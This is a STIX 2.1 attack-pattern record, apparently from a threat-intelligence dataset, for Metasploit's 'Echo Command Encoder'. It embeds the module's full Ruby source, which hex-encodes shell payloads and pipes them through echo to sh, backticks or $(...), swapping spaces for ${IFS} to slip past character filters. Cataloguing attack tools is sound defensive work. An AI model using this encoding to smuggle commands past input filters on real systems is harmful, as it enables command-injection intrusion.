{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b8067fce-85e0-4439-8b1c-08966a0341f9",
    "created": "2024-08-14T16:33:19.227427Z",
    "modified": "2024-08-14T16:33:19.227439Z",
    "name": "Echo Command Encoder",
    "description": " This encoder uses echo and backlash escapes to avoid commonly restricted characters. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/cmd/echo.rb",
            "external_id": "echo.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder\n  Rank = GoodRanking\n\n  def initialize\n    super(\n      'Name'             => 'Echo Command Encoder',\n      'Description'      => %q{\n        This encoder uses echo and backlash escapes to avoid commonly restricted characters.\n      },\n      'Author'           => 'hdm',\n      'Arch'             => ARCH_CMD,\n      'Platform'         => 'unix',\n      'EncoderType'      => Msf::Encoder::Type::CmdUnixEcho)\n  end\n\n\n  #\n  # Encodes the payload\n  #\n  def encode_block(state, buf)\n    # Skip encoding for empty badchars\n    if state.badchars.length == 0\n      return buf\n    end\n\n    if state.badchars.include?(\"-\")\n      raise EncodingError\n    else\n      # Without an escape character we can't escape anything, so echo\n      # won't work.\n      if state.badchars.include?(\"\\\\\")\n        raise EncodingError\n      else\n        buf = encode_block_bash_echo(state,buf)\n      end\n    end\n\n    return buf\n  end\n\n  #\n  # Uses bash's echo -ne command to hex encode the command string\n  #\n  def encode_block_bash_echo(state, buf)\n\n    hex = ''\n\n    # Can we use single quotes to enclose the echo arguments?\n    if state.badchars.include?(\"'\")\n      hex = buf.unpack('C*').collect { |c| \"\\\\\\\\\\\\x%.2x\" % c }.join\n    else\n      hex = \"'\" + buf.unpack('C*').collect { |c| \"\\\\x%.2x\" % c }.join + \"'\"\n    end\n\n    # Are pipe characters restricted?\n    if state.badchars.include?(\"|\")\n      # How about backticks?\n      if state.badchars.include?(\"`\")\n        # Last ditch effort, dollar paren\n        if state.badchars.include?(\"$\") or state.badchars.include?(\"(\")\n          raise EncodingError\n        else\n          buf = \"$(/bin/echo -ne #{hex})\"\n        end\n      else\n        buf = \"`/bin/echo -ne #{hex}`\"\n      end\n    else\n      buf = \"/bin/echo -ne #{hex}|sh\"\n    end\n\n    # Remove spaces from the command string\n    if state.badchars.include?(\" \")\n      buf.gsub!(/\\s/, '${IFS}')\n    end\n\n    return buf\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}